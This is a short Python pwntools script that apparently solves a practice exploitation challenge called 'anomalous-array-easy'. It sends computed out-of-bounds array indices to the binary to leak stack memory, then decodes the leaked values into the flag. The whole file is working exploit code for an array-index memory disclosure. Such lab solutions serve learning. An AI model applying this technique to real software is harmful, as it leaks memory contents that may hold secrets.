#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/anomalous-array-easy')

rbp_addr = 0x7fff89c12480
flag_start  = rbp_addr - 0x5f0
array_start = rbp_addr - (0x5e8 - (0x84 * 8)) #mov    QWORD PTR [rbp+rdx*8-0x5e8],rax
index_for_flag_first_part = (array_start - flag_start) * -1 // 8 # array size is 8bit for each one element in arrayand times -1 because flag is up in stack that array

def return_hacker_code(data):
    regex = r"Your hacker number is [0-9a-f]+\n"
    match = re.findall(regex,data)[0].replace("Your hacker number is ","").strip()
    match = match.zfill(len(match) + len(match) % 2)
    return match

def unhex(data):
    return unhexlify(data).decode()[::-1]

index = index_for_flag_first_part
flag = ""
for i in range(8):
    io = process()
    io.sendline(str(index).encode())
    data = io.recvall()
#    print(data.decode())
    flag += unhex(return_hacker_code(data.decode())) 
    index += 1
    io.close()
print(flag)
